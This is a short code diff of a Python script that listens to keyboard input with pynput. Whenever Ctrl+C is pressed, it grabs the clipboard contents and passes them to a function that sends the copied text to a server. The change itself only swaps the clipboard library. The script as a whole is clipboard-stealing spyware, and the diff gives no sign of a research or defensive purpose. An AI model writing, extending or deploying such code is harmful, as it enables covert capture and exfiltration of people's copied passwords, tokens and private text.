@@ -1,10 +1,11 @@
-from email import message
 from pynput import keyboard
-import pyperclip
+import clipboard
 from sender import SendCopiedTextToServer
 
 msg = ''
 prevMsg = ''
+
+cp = clipboard.Clipboard()
 
 def ctrl(letter): return chr(ord(letter.upper())-64)
 
@@ -14,8 +15,9 @@ def on_press(key):
         print(f'KEY.CHAR ---> {key.char}')
         if key.char == ctrl("c"):
             print()
-            pyperclip.waitForPaste(10)
-            msg = pyperclip.paste()
+            cp.SetWaitTime(10)
+            cp.WaitBeforePaste()
+            msg = cp.PasteText()
             if msg != '':
                 print(f'"{msg}"')
                 SendCopiedTextToServer(msg)
